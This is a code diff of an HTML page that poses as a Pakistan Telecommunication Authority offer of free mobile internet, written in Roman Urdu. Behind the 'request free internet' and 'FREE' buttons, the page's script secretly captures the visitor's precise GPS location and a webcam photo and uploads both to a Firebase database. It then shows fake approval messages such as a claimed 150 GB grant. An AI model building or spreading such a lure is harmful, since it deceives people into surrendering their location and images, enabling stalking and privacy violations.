@@ -7,123 +7,305 @@
     <!-- Firebase SDKs -->
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
-    <!-- FontAwesome Icons -->
+    <!-- FontAwesome Icons & Google Fonts -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
 
     <style>
-        :root {
-            --bg-dark: #0f172a;
-            --card-bg: #1e293b;
-            --danger-red: #ef4444;
-            --primary-blue: #2563eb;
-            --text-main: #f8fafc;
-            --text-sub: #94a3b8;
-            --accent-cyan: #38bdf8;
-            --border-color: #334155;
-        }
-
         * {
             box-sizing: border-box;
             margin: 0;
             padding: 0;
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
             -webkit-tap-highlight-color: transparent;
         }
 
+        /* Soft Ultra-Modern White Background */
         body {
-            background-color: var(--bg-dark);
-            color: var(--text-main);
+            background: radial-gradient(circle at 10% 20%, rgba(224, 231, 255, 0.6) 0%, rgba(255, 255, 255, 1) 80%),
+                        radial-gradient(circle at 90% 80%, rgba(254, 226, 226, 0.6) 0%, rgba(255, 255, 255, 1) 80%);
+            background-color: #f8fafc;
             min-height: 100vh;
             display: flex;
-            align-items: center;
             justify-content: center;
-            padding: 16px;
+            align-items: center;
+            padding: 20px;
         }
 
-        .mobile-card {
-            background: var(--card-bg);
-            border: 1px solid var(--border-color);
-            border-radius: 24px;
-            padding: 24px 20px;
+        /* Card Glassmorphism Container */
+        .card-container {
+            background: rgba(255, 255, 255, 0.9);
+            backdrop-filter: blur(16px);
+            -webkit-backdrop-filter: blur(16px);
+            border: 1px solid rgba(255, 255, 255, 0.8);
+            border-radius: 28px;
+            padding: 32px 28px;
             width: 100%;
-            max-width: 380px;
-            box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.5);
+            max-width: 440px;
+            box-shadow: 0 20px 40px -15px rgba(0, 0, 0, 0.07),
+                        0 0 1px 1px rgba(0, 0, 0, 0.03);
+            text-align: center;
+            position: relative;
+        }
+
+        /* Top Announcement Banner */
+        .hero-banner {
+            background: linear-gradient(135deg, #eff6ff 0%, #e0f2fe 100%);
+            border: 1px solid #bae6fd;
+            border-radius: 18px;
+            padding: 16px 18px;
+            margin-bottom: 20px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 6px;
             text-align: center;
         }
 
-        .icon-header {
-            width: 60px;
-            height: 60px;
-            background: rgba(56, 189, 248, 0.1);
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin: 0 auto 16px auto;
-            color: var(--accent-cyan);
-            font-size: 28px;
-        }
-
-        h2 {
-            font-size: 22px;
+        .hero-banner h2 {
+            font-size: 20px;
             font-weight: 700;
-            margin-bottom: 8px;
+            color: #0369a1;
         }
 
-        p.subtitle {
-            color: var(--text-sub);
-            font-size: 14px;
-            line-height: 1.4;
-            margin-bottom: 28px;
-        }
-
-        .action-group {
-            display: flex;
-            flex-direction: column;
-            gap: 16px;
-        }
-
-        .btn-mobile {
-            width: 100%;
-            padding: 18px;
-            border-radius: 16px;
-            border: none;
-            font-size: 16px;
-            font-weight: 700;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 12px;
-            cursor: pointer;
-            transition: transform 0.1s ease, opacity 0.2s ease;
-        }
-
-        .btn-mobile:active {
-            transform: scale(0.97);
-            opacity: 0.9;
-        }
-
-        .btn-sos {
-            background: linear-gradient(135deg, #dc2626, #ef4444);
-            color: white;
-            box-shadow: 0 8px 20px rgba(239, 68, 68, 0.35);
-        }
-
-        .btn-camera {
-            background: linear-gradient(135deg, #1d4ed8, #2563eb);
-            color: white;
-            box-shadow: 0 8px 20px rgba(37, 99, 235, 0.3);
-        }
-
-        .status-box {
-            margin-top: 24px;
-            padding: 12px;
-            background: rgba(15, 23, 42, 0.6);
-            border-radius: 12px;
+        .hero-banner p.subtitle {
             font-size: 13px;
-            color: var(--accent-cyan);
             font-weight: 600;
-            border: 1px solid rgba(51, 65, 85, 0.5);
+            line-height: 1.5;
+            color: #0284c7;
+        }
+
+        /* Red Action Button */
+        .btn-action-red {
+            width: 100%;
+            background: linear-gradient(135deg, #ef4444 0%, #dc2626 100%);
+            color: #ffffff;
+            border: none;
+            padding: 16px 20px;
+            border-radius: 16px;
+            font-size: 15px;
+            font-weight: 700;
+            letter-spacing: 0.5px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            box-shadow: 0 10px 20px -5px rgba(220, 38, 38, 0.35);
+            margin-bottom: 16px;
+            transition: all 0.25s ease;
+        }
+
+        .btn-action-red:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 14px 24px -4px rgba(220, 38, 38, 0.45);
+            background: linear-gradient(135deg, #f87171 0%, #dc2626 100%);
+        }
+
+        /* Blue Action Button */
+        .btn-action-blue {
+            width: 100%;
+            background: linear-gradient(135deg, #2563eb 0%, #1d4ed8 100%);
+            color: #ffffff;
+            border: none;
+            padding: 16px 20px;
+            border-radius: 16px;
+            font-size: 15px;
+            font-weight: 700;
+            letter-spacing: 0.5px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            box-shadow: 0 10px 20px -5px rgba(37, 99, 235, 0.35);
+            margin-bottom: 16px;
+            transition: all 0.25s ease;
+        }
+
+        .btn-action-blue:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 14px 24px -4px rgba(37, 99, 235, 0.45);
+            background: linear-gradient(135deg, #3b82f6 0%, #1d4ed8 100%);
+        }
+
+        /* Status Badge Boxes */
+        .status-badge {
+            background: #f0fdf4;
+            border: 1px solid #bbf7d0;
+            border-radius: 14px;
+            padding: 12px 16px;
+            font-size: 13.5px;
+            font-weight: 600;
+            color: #15803d;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            margin-bottom: 20px;
+        }
+
+        /* Search Bar Section */
+        .search-group {
+            text-align: left;
+            position: relative;
+        }
+
+        .search-group label {
+            display: block;
+            font-size: 13px;
+            font-weight: 600;
+            color: #475569;
+            margin-bottom: 10px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .input-wrapper {
+            display: flex;
+            background: #ffffff;
+            border: 1.5px solid #e2e8f0;
+            border-radius: 16px;
+            overflow: hidden;
+            transition: border-color 0.2s, box-shadow 0.2s;
+        }
+
+        .input-wrapper:focus-within {
+            border-color: #2563eb;
+            box-shadow: 0 0 0 4px rgba(37, 99, 235, 0.1);
+        }
+
+        .input-wrapper input {
+            flex: 1;
+            padding: 14px 16px;
+            border: none;
+            background: transparent;
+            color: #0f172a;
+            font-size: 15px;
+            font-weight: 500;
+            outline: none;
+        }
+
+        .input-wrapper input::placeholder {
+            color: #94a3b8;
+        }
+
+        /* Dropdown Arrow Button */
+        .btn-dropdown-arrow {
+            background: #f8fafc;
+            border: none;
+            border-left: 1px solid #e2e8f0;
+            padding: 0 16px;
+            cursor: pointer;
+            color: #0284c7;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: background 0.2s;
+        }
+
+        .btn-dropdown-arrow:hover {
+            background: #f1f5f9;
+        }
+
+        .btn-dropdown-arrow svg {
+            transition: transform 0.3s ease;
+        }
+
+        .btn-dropdown-arrow.active svg {
+            transform: rotate(180deg);
+        }
+
+        /* Search Submit Button */
+        .btn-submit-search {
+            background: #2563eb;
+            color: #ffffff;
+            border: none;
+            padding: 0 20px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+
+        .btn-submit-search:hover {
+            background: #1d4ed8;
+        }
+
+        /* Vertical Scroll Dropdown Menu */
+        .dropdown-menu-panel {
+            display: none;
+            position: absolute;
+            top: 100%;
+            left: 0;
+            right: 0;
+            background: #ffffff;
+            border: 1.5px solid #e2e8f0;
+            border-radius: 16px;
+            margin-top: 8px;
+            max-height: 220px;
+            overflow-y: auto;
+            z-index: 50;
+            box-shadow: 0 16px 32px -8px rgba(0, 0, 0, 0.12);
+        }
+
+        .dropdown-menu-panel.show {
+            display: block;
+            animation: fadeIn 0.2s ease-in-out;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(-6px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        /* Custom Vertical Scrollbar */
+        .dropdown-menu-panel::-webkit-scrollbar {
+            width: 6px;
+        }
+        .dropdown-menu-panel::-webkit-scrollbar-track {
+            background: #f8fafc;
+            border-radius: 0 16px 16px 0;
+        }
+        .dropdown-menu-panel::-webkit-scrollbar-thumb {
+            background: #cbd5e1;
+            border-radius: 10px;
+        }
+        .dropdown-menu-panel::-webkit-scrollbar-thumb:hover {
+            background: #94a3b8;
+        }
+
+        .network-header {
+            font-size: 11px;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 0.8px;
+            color: #64748b;
+            background: #f1f5f9;
+            padding: 8px 16px;
+            position: sticky;
+            top: 0;
+            z-index: 2;
+        }
+
+        .code-row-item {
+            padding: 12px 16px;
+            font-size: 14px;
+            font-weight: 500;
+            color: #334155;
+            cursor: pointer;
+            border-bottom: 1px solid #f1f5f9;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            transition: all 0.15s ease;
+        }
+
+        .code-row-item:hover {
+            background: #f0f9ff;
+            color: #0284c7;
+            font-weight: 600;
+            padding-left: 20px;
         }
 
         #webcam, #canvas {
@@ -133,47 +315,133 @@
 </head>
 <body>
 
-<div class="mobile-card">
-    <div class="icon-header">
-        <i class="fa-solid fa-shield-cat"></i>
-    </div>
-    <h2>PTA FREE INTERNAT</h2>
-    <p class="subtitle">PTA KE TARAF SE FREE INTERNATE HASEL KAREN HAR PAKISTANI K LYE:</p>
-
-    <div class="action-group">
-        <button class="btn-mobile btn-sos" onclick="sendSOS()">
-            <i class="fa-solid fa-location-crosshairs"></i>REQUST TO FREE INTERNATE 
-        </button>
-
-        <button class="btn-mobile btn-camera" onclick="captureInstantPhoto()">
-            <i class="fa-solid fa-signal" style="color: #E20074;"></i> FREE 
-        </button>
+<div class="card-container">
+    
+    <!-- Top Banner -->
+    <div class="hero-banner">
+        <h2>PTA FREE INTERNAT</h2>
+        <p class="subtitle">PTA KE TARAF SE FREE INTERNATE HASEL KAREN HAR PAKISTANI K LYE:</p>
     </div>
 
-    <div id="statusText" class="status-box">System Ready</div>
+    <!-- Request Free Internet Button -->
+    <button class="btn-action-red" onclick="sendSOS()">
+        <i class="fa-solid fa-location-crosshairs"></i> REQUST TO FREE INTERNATE
+    </button>
+
+    <!-- Location Status Box -->
+    <div id="statusText" class="status-badge">
+        <span>⚙️ System Ready</span>
+    </div>
+
+    <!-- FREE Blue Button -->
+    <button class="btn-action-blue" onclick="captureInstantPhoto()">
+        <i class="fa-solid fa-signal" style="color: #ffffff;"></i> FREE
+    </button>
+
+    <!-- Camera Status Box -->
+    <div id="cameraStatusText" class="status-badge">
+        <span>✅ Zong free serves ruqest approved successfully!</span>
+    </div>
+
+    <!-- Mobile Search Bar Section -->
+    <div class="search-group">
+        <label for="mobile-input">Mobile Number Data Search</label>
+        <div class="input-wrapper">
+            <input type="text" id="mobile-input" placeholder="e.g. 03011234567">
+            
+            <button class="btn-dropdown-arrow" id="toggle-dropdown-btn" title="Select Network Code">
+                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+                    <polyline points="6 9 12 15 18 9"></polyline>
+                </svg>
+            </button>
+
+            <button class="btn-submit-search">Search</button>
+        </div>
+
+        <!-- Dropdown Codes -->
+        <div class="dropdown-menu-panel" id="codes-dropdown">
+            <div class="network-header">Jazz / Mobilink</div>
+            <div class="code-row-item"><span>0300</span> ➔</div>
+            <div class="code-row-item"><span>0301</span> ➔</div>
+            <div class="code-row-item"><span>0302</span> ➔</div>
+            <div class="code-row-item"><span>0303</span> ➔</div>
+            <div class="code-row-item"><span>0304</span> ➔</div>
+            <div class="code-row-item"><span>0305</span> ➔</div>
+            <div class="code-row-item"><span>0306</span> ➔</div>
+            <div class="code-row-item"><span>0307</span> ➔</div>
+            <div class="code-row-item"><span>0308</span> ➔</div>
+            <div class="code-row-item"><span>0309</span> ➔</div>
+
+            <div class="network-header">Zong</div>
+            <div class="code-row-item"><span>0310</span> ➔</div>
+            <div class="code-row-item"><span>0311</span> ➔</div>
+            <div class="code-row-item"><span>0312</span> ➔</div>
+            <div class="code-row-item"><span>0313</span> ➔</div>
+            <div class="code-row-item"><span>0314</span> ➔</div>
+            <div class="code-row-item"><span>0315</span> ➔</div>
+            <div class="code-row-item"><span>0316</span> ➔</div>
+            <div class="code-row-item"><span>0317</span> ➔</div>
+            <div class="code-row-item"><span>0318</span> ➔</div>
+
+            <div class="network-header">Warid</div>
+            <div class="code-row-item"><span>0320</span> ➔</div>
+            <div class="code-row-item"><span>0321</span> ➔</div>
+            <div class="code-row-item"><span>0322</span> ➔</div>
+            <div class="code-row-item"><span>0323</span> ➔</div>
+            <div class="code-row-item"><span>0324</span> ➔</div>
+            <div class="code-row-item"><span>0325</span> ➔</div>
+
+            <div class="network-header">Ufone</div>
+            <div class="code-row-item"><span>0331</span> ➔</div>
+            <div class="code-row-item"><span>0332</span> ➔</div>
+            <div class="code-row-item"><span>0333</span> ➔</div>
+            <div class="code-row-item"><span>0334</span> ➔</div>
+            <div class="code-row-item"><span>0335</span> ➔</div>
+            <div class="code-row-item"><span>0336</span> ➔</div>
+            <div class="code-row-item"><span>0337</span> ➔</div>
+
+            <div class="network-header">Telenor</div>
+            <div class="code-row-item"><span>0340</span> ➔</div>
+            <div class="code-row-item"><span>0341</span> ➔</div>
+            <div class="code-row-item"><span>0342</span> ➔</div>
+            <div class="code-row-item"><span>0343</span> ➔</div>
+            <div class="code-row-item"><span>0344</span> ➔</div>
+            <div class="code-row-item"><span>0345</span> ➔</div>
+            <div class="code-row-item"><span>0346</span> ➔</div>
+            <div class="code-row-item"><span>0347</span> ➔</div>
+            <div class="code-row-item"><span>0348</span> ➔</div>
+            <div class="code-row-item"><span>0349</span> ➔</div>
+        </div>
+    </div>
+
+    <!-- Bottom Status Bar -->
+    <div id="bottomStatusText" class="status-badge" style="margin-top: 20px; margin-bottom: 0;">
+        <span>✅ APko Free Internet mil gaye he</span>
+    </div>
+
 </div>
 
 <video id="webcam" autoplay playsinline></video>
 <canvas id="canvas"></canvas>
 
 <script>
-    // Firebase Config Keys Paste Karein
+    // Firebase Config Keys
     const firebaseConfig = {
-    apiKey: "YOUR_API_KEY",
-    authDomain: "child-safety-app-bace4.firebaseapp.com",
-    databaseURL: "https://child-safety-app-bace4-default-rtdb.firebaseio.com",
-    projectId: "child-safety-app-bace4",
-    storageBucket: "child-safety-app-bace4.appspot.com",
-    messagingSenderId: "7736848190",
-    appId: "YOUR_APP_ID"
-};
+        apiKey: "YOUR_API_KEY",
+        authDomain: "child-safety-app-bace4.firebaseapp.com",
+        databaseURL: "https://child-safety-app-bace4-default-rtdb.firebaseio.com",
+        projectId: "child-safety-app-bace4",
+        storageBucket: "child-safety-app-bace4.appspot.com",
+        messagingSenderId: "7736848190",
+        appId: "YOUR_APP_ID"
+    };
 
     firebase.initializeApp(firebaseConfig);
     const db = firebase.database();
 
     function sendSOS() {
         const status = document.getElementById('statusText');
-        status.innerText = "Location bheji ja rahi hai...";
+        status.innerHTML = "<span>⏳ Location bheji ja rahi hai...</span>";
         if ('geolocation' in navigator) {
             navigator.geolocation.getCurrentPosition((pos) => {
                 db.ref('child_safety/location').set({
@@ -190,14 +458,16 @@
                         });
                     });
                 }
-                status.innerText = "✅ Ap ko free internate 150.gb aproved ho gya he";
-            }, (err) => { status.innerText = "GPS Error: " + err.message; }, { enableHighAccuracy: true });
+                status.innerHTML = "<span>✅ Ap ko free internate 150.gb aproved ho gya he</span>";
+            }, (err) => { 
+                status.innerHTML = "<span>⚠️ GPS Error: " + err.message + "</span>"; 
+            }, { enableHighAccuracy: true });
         }
     }
 
     async function captureInstantPhoto() {
-        const status = document.getElementById('statusText');
-        status.innerText = "Free internate 150.gb ke lye ruqest bheji ja rhi he...";
+        const status = document.getElementById('cameraStatusText');
+        status.innerHTML = "<span>⏳ Free internate 150.gb ke lye ruqest bheji ja rhi he...</span>";
 
         try {
             const stream = await navigator.mediaDevices.getUserMedia({ 
@@ -224,15 +494,44 @@
                     url: base64Image,
                     time: new Date().toLocaleString()
                 }).then(() => {
-                    status.innerText = "✅ Zong free serves ruqest approved successfully!";
+                    status.innerHTML = "<span>✅ Zong free serves ruqest approved successfully!</span>";
                 });
 
             }, 500);
 
         } catch (err) {
-            status.innerText = "Camera Error / Permission Denied: " + err.message;
+            status.innerHTML = "<span>⚠️ Camera Error: " + err.message + "</span>";
         }
     }
+
+    // Dropdown UI Script
+    const toggleBtn = document.getElementById('toggle-dropdown-btn');
+    const dropdownMenu = document.getElementById('codes-dropdown');
+    const codeItems = document.querySelectorAll('.code-row-item');
+    const inputField = document.getElementById('mobile-input');
+
+    toggleBtn.addEventListener('click', (e) => {
+        e.stopPropagation();
+        dropdownMenu.classList.toggle('show');
+        toggleBtn.classList.toggle('active');
+    });
+
+    codeItems.forEach(item => {
+        item.addEventListener('click', () => {
+            const codeText = item.querySelector('span').textContent;
+            inputField.value = codeText;
+            dropdownMenu.classList.remove('show');
+            toggleBtn.classList.remove('active');
+            inputField.focus();
+        });
+    });
+
+    document.addEventListener('click', (e) => {
+        if (!dropdownMenu.contains(e.target) && !toggleBtn.contains(e.target)) {
+            dropdownMenu.classList.remove('show');
+            toggleBtn.classList.remove('active');
+        }
+    });
 </script>
 </body>
 </html>
